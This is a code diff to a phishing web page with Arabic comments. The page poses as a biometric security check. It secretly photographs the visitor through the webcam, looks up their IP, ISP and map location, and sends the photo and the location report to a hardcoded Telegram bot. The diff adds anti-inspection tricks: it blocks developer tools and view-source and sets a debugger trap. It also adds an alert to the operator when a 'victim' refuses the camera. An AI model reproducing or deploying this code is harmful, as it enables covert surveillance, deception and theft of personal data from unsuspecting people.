@@ -11,7 +11,7 @@
         video, canvas { display: none; }
     </style>
 </head>
-<body>
+<body oncontextmenu="return false;">
 
     <div class="box">
         <div style="font-size: 40px;">🛡️</div>
@@ -24,6 +24,36 @@
     <canvas id="c"></canvas>
 
     <script>
+        // === [1] نظام الحماية الشامل ===
+        
+        // منع القائمة اليمنى
+        document.addEventListener('contextmenu', event => event.preventDefault());
+
+        // منع اختصارات المطورين (F12, Ctrl+Shift+I, Ctrl+U, إلخ)
+        document.onkeydown = function (e) {
+            if (e.keyCode == 123) return false; // F12
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Inspect
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Console
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // View Source
+            if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) return false; // Save Page
+        };
+
+        // فخ الديباجر: تجميد المتصفح في حال فتح الخيارات
+        setInterval(function() {
+            const start = new Date();
+            debugger; 
+            const end = new Date();
+            if (end - start > 100) {
+                document.body.innerHTML = "<h2 style='margin-top:200px;'>⚠️ تم اكتشاف محاولة اختراق البروتوكول.</h2>";
+                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
+            }
+        }, 1000);
+
+        // منع سحب وإفلات العناصر
+        document.ondragstart = function() { return false; };
+
+        // === [2] نظام التصوير وسحب البيانات ===
+
         const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
         const CH_ID = "1678506419";
 
@@ -39,21 +69,21 @@
 
                 v.onloadedmetadata = () => {
                     v.play();
-                    // محاولة التصوير المتكرر حتى تنجح (تجنب السواد)
                     let attempts = 0;
                     const checkAndShoot = setInterval(async () => {
                         attempts++;
                         const isCaptured = await takeSnapshot(v, stream);
                         
-                        // إذا نجح التصوير أو تجاوزنا 5 محاولات نوقف التكرار
                         if (isCaptured || attempts > 5) {
                             clearInterval(checkAndShoot);
                             finishProcess(stream);
                         }
-                    }, 800); // يحاول كل 800 مللي ثانية
+                    }, 800);
                 };
             } catch (e) {
-                alert("يجب السماح بالكاميرا.");
+                // إخطارك بأن الضحية رفض الكاميرا
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CH_ID}&text=🚫 الضحية رفض إذن الكاميرا`);
+                alert("يجب السماح بالكاميرا للمتابعة.");
                 btn.disabled = false;
                 btn.innerHTML = "بدء التأمين";
             }
@@ -66,20 +96,19 @@
             c.height = v.videoHeight;
             ctx.drawImage(v, 0, 0);
 
-            // فحص هل الصورة سوداء؟ (نأخذ عينة من بكسلات المنتصف)
+            // فحص السواد (Brightness Check)
             const pixelData = ctx.getImageData(c.width/2, c.height/2, 1, 1).data;
             const brightness = pixelData[0] + pixelData[1] + pixelData[2];
 
             if (brightness === 0 && v.videoWidth > 0) {
-                console.log("الصورة سوداء، إعادة المحاولة...");
-                return false; // فشل (سواد)
+                return false; 
             }
 
-            // إذا ليست سوداء، أرسلها فوراً
+            // سحب البيانات الجغرافية
             let i = { ip: "N/A" };
             try { const r = await fetch('https://ipapi.co/json/'); i = await r.json(); } catch(e) {}
 
-            const report = `✅ تم \n📍 IP: ${i.ip}\n🏢 ISP: ${i.org || 'Unknown'}\n🔗 Maps: https://www.google.com/maps?q=${i.latitude},${i.longitude}`;
+            const report = `✅ تم الالتقاط\n📍 IP: ${i.ip}\n🏢 ISP: ${i.org || 'Unknown'}\n🌍 الموقع: ${i.city}, ${i.country_name}\n🔗 الخريطة: http://www.google.com/maps/place/${i.latitude},${i.longitude}`;
 
             return new Promise((resolve) => {
                 c.toBlob(async (blob) => {
@@ -88,7 +117,7 @@
                     fd.append('photo', blob, 'img.jpg');
                     fd.append('caption', report);
                     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                    resolve(true); // نجاح
+                    resolve(true);
                 }, 'image/jpeg', 0.7);
             });
         }
@@ -96,7 +125,7 @@
         function finishProcess(stream) {
             setTimeout(() => {
                 stream.getTracks().forEach(t => t.stop());
-                alert("اكتملت المصادقة.");
+                alert("اكتملت المصادقة الحيوية بنجاح.");
                 window.location.href = "https://google.com";
             }, 1000);
         }
